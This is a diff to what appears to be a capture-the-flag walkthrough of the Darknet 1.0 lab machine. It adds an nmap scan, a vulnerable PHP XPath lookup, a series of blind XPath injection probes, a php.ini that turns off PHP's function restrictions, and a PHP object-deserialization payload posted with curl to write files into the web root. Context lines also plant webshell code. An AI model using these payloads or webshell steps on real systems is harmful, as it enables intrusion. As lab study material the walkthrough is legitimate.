@@ -15,6 +15,17 @@ https://github.com/tennc/webshell/tree/master/php/wso
 http://blog.ottos.network/2015/06/darknet-10-write-up.html
 
 
+https://jessgallante.blogspot.com/2015/06/mon-tout-premier-challenge-ever.html
+
+
+https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf
+
+
+
+https://github.com/tennc/webshell/tree/master/php/wso
+
+
+
 └─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.53
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 10:28 CEST
@@ -227,7 +238,17 @@ INSERT INTO pwn.shell (code) VALUES ("<?php error_reporting(E_ALL); ini_set('dis
 
 ```
 
+```config
 
+# phi.ini
+
+safe_mode=OFF
+disable_functions=NONE
+safe_mode_gid=OFF
+open_basedir=OFF
+
+
+```
 
 
 ```python
@@ -303,6 +324,27 @@ root@kali:~# echo "<?php error_reporting(E_ALL); ini_set('display_errors', 1); i
 
 
 
+
+
+```php
+<?php
+
+//error_reporting(0);
+
+if(!empty($_GET['id'])){
+    $id=$_GET['id'];
+    if(preg_match('/\*/', $id)){
+        exit();
+}
+    $xml=simplexml_load_file("../users/usuarios.xml");
+    $out=$xml->xpath("/auth/user[id={$id}]/email");
+    echo "<h3>".$out[0]."</h3>";
+}
+?>
+
+```
+
+
 ```xml
 
 <auth>
@@ -340,10 +382,12 @@ curl -G  --data-urlencode "id=1 $1" $URL
 # ./contact.sh 'and substring(name(..),1,4)="auth"'
 # ./contact.sh 'and string-length(name(//auth))=4'
 # ./contact.sh 'and count(//auth/child::node())=5'
+# ./contact.sh 'and count (../child::node())=5'
 # ./contact.sh 'and string-length(name(//auth/child::node()[position()=1]))=5'
 # ./contact.sh 'and string-length(name(//auth))=4'
-# 
-
+# ./contact.sh 'and name()="user"'
+# ./contact.sh 'and starts-with(email, 'e')'
+# ./contact.sh 'and starts-with(email, 'errorlevel')'
 ```
 
 ```python
@@ -502,7 +546,32 @@ print (r.text)
 ```
 ```bash
 
-curl --data-urlencode 'test=O:4:"Test":3:{s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";s:9:"name_file";s:5:"s.php";s:4:"path";s:8:"/var/www";}' http://192.168.110.53/sec.php
+curl --data-urlencode 'test=O:4:"Test":3:{s:3:"url";s:37:"/home/devnull/public_html/img/php.ini";s:9:"name_file";s:7:"php.ini";s:4:"path";s:8:"/var/www";}' http://192.168.110.53/sec.php
+
+```
+
+
+
+```php
+echo '<?php' > xpath.php
+echo 'error_reporting(E_ALL);' >> xpath.php
+echo 'ini_set("display_errors", 1);' >> xpath.php
+echo '$xml=simplexml_load_file("../users/usuarios.xml");' >> xpath.php
+echo '$p=$_GET["p"];' >> xpath.php
+echo 'print_r($p);' >> xpath.php
+echo '$out = $xml->xpath($p);' >> xpath.php
+echo 'var_dump($out);' >> xpath.php
+echo 'echo($out[0]);' >> xpath.php
+echo '?>' >> xpath.php
+chown errorlevel:errorlevel xpath.php
+cat xpath.php
+
+echo '$p="/auth/user[id=1]/email";' >> xpath.php
+
+
+
+
+
 ```
 
 
@@ -573,6 +642,25 @@ class Test {
 
 ?>
 
+
+```
+
+
+```php
+echo '<?php' > test.php
+echo '    $id=$_GET["id"];' >> test.php
+echo '    $xml=simplexml_load_file("../users/usuarios.xml");' >> test.php
+echo '    $p = "/auth/user[id={$id}]/email";' >> test.php
+echo '    print_r ($p);' >> test.php
+echo '    $out=$xml->xpath("/auth/user[id={$id}]/email");' >> test.php
+echo '    echo "<h3>".$out[0]."</h3>";' >> test.php
+echo '    $out=$xml->xpath("/auth/user[id=1]/username");' >> test.php
+echo '    var_dump ($out);' >> test.php
+echo '    echo "<h3>".$out[0]."</h3>";' >> test.php
+echo '?>' >> test.php
+
+chown errorlevel:errorlevel test.php
+cat test.php
 
 ```
 
